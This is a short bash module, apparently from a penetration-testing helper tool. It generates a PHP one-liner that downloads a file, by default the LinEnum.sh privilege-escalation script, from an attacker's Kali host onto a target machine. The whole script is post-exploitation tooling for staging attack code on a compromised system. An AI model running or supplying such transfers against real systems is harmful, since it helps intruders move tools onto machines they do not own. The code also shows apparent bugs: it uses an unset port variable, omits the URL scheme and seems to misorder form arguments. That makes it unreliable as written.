#!/bin/bash

: '
php: download file one liner with file_get_contents
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SERVER_PORT_FIELD=$(form_item  "server port" "number" "server_port" "80")
SERVER_FILE_FIELD=$(form_item  "server file location" "server_file_location" "/LinEnum.sh")
LOCAL_FILE_FIELD=$(form_item  "local file location" "local_file_location" "LinEnum.sh")

# Generate GUI form
generate_form "${SERVER_PORT_FIELD}" "${SERVER_FILE_FIELD}" "${LOCAL_FILE_FIELD}"

SERVER_PORT=${form_data["server_port"]}
SERVER_FILE=${form_data["server_file_location"]}
LOCAL_FILE=${form_data["local_file_location"]}

execute_command "php -r '\$file = file_get_contents(\"${KALI_IP}:${PORT}/${SERVER_FILE}\"); file_put_contents(\"${LOCAL_FILE}\",\$file);'"
create_new_line
